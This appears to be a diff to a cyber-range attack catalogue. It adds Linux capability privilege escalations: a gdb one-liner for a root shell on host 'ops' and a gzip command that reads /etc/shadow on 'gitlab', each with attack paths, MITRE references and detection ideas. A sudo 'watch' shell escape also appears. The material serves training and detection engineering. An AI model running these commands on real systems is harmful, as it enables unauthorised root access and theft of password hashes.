@@ -373,6 +373,78 @@ sudo watch 'reset; exec /bin/sh 1>&0 2>&0'
 
 ---
 
+## Linux Capabilities
+
+### cap_gdb — CAP_SETUID → Root Shell (ops)
+
+| Field | Detail |
+|---|---|
+| **Host** | ops (10.2.50.2) |
+| **Entry point** | Any user with SSH access (no sudo required) |
+| **Condition** | `/usr/bin/gdb` has `cap_setuid+eip` capability set |
+| **Primitive** | gdb's Python interpreter calls `os.setuid(0)` — capability allows the setuid syscall without SUID bit — then drops to a root shell |
+| **GTFOBins** | [gdb — Capabilities](https://gtfobins.github.io/gtfobins/gdb/#capabilities) |
+| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |
+
+**Exploit:**
+
+```bash
+gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit /dev/null
+```
+
+**Attack path:**
+
+```
+SSH as any user (no sudo)
+  → Enumerate capabilities: getcap -r / 2>/dev/null
+  → Identify /usr/bin/gdb with cap_setuid+eip
+  → gdb Python: os.setuid(0) → !sh → root shell (T1548.001)
+```
+
+**Detection opportunities:**
+
+- `gdb` process spawning `/bin/sh` with euid=0 from non-root user (auditd execve, euid field)
+- `getcap` enumeration on the filesystem (process arguments)
+- Python `setuid` syscall from gdb context
+
+---
+
+### cap_gzip — CAP_DAC_OVERRIDE → Arbitrary File Read (gitlab)
+
+| Field | Detail |
+|---|---|
+| **Host** | gitlab (10.2.50.15) |
+| **Entry point** | Any user with SSH access (no sudo required) |
+| **Condition** | `/usr/bin/gzip` has `cap_dac_override+eip` capability set |
+| **Primitive** | `CAP_DAC_OVERRIDE` bypasses DAC (Discretionary Access Control) read/write checks — gzip can read any file regardless of permissions, leaking content via compression error output |
+| **GTFOBins** | [gzip — Capabilities](https://gtfobins.github.io/gtfobins/gzip/#capabilities) |
+| **MITRE ATT&CK** | [T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) |
+
+**Exploit:**
+
+```bash
+# Read /etc/shadow (or any root-owned file)
+LFILE=/etc/shadow
+gzip -f "$LFILE" -t
+```
+
+**Attack path:**
+
+```
+SSH as any user (no sudo)
+  → Enumerate capabilities: getcap -r / 2>/dev/null
+  → Identify /usr/bin/gzip with cap_dac_override+eip
+  → gzip -f /etc/shadow -t → shadow hash contents in error output (T1548.001)
+```
+
+**Detection opportunities:**
+
+- `gzip` accessing files owned by root that the calling user cannot normally read (auditd openat syscall with sensitive path)
+- `getcap` enumeration (process arguments)
+- `gzip` invoked with `-t` flag on `/etc/shadow`, `/etc/passwd`, `/root/` paths
+
+---
+
 ## By Technology
 
 | Technology | Vectors |
@@ -381,8 +453,8 @@ sudo watch 'reset; exec /bin/sh 1>&0 2>&0'
 | ADCS | ESC1–ESC16 certificate template misconfigurations, RDP access to CA |
 | IIS + ASP.NET + MSSQL | Web application attacks, SQL injection, authentication bypass |
 | GitLab CE | Source code exposure, CI/CD pipeline abuse, secret leakage, SUID privesc |
-| Linux — gitlab | SUID binary abuse (R, apt-get, less, rsync) |
-| Linux — ops | Restricted sudo escape (ansible-playbook, ansible-test, certbot, watch) |
+| Linux — gitlab | SUID binary abuse (R, apt-get, less, rsync), capabilities (gzip/CAP_DAC_OVERRIDE) |
+| Linux — ops | Restricted sudo escape (ansible-playbook, ansible-test, certbot, watch), capabilities (gdb/CAP_SETUID) |
 | Elastic SIEM | Detection engineering, alert tuning, log analysis |
 
 ## Notes
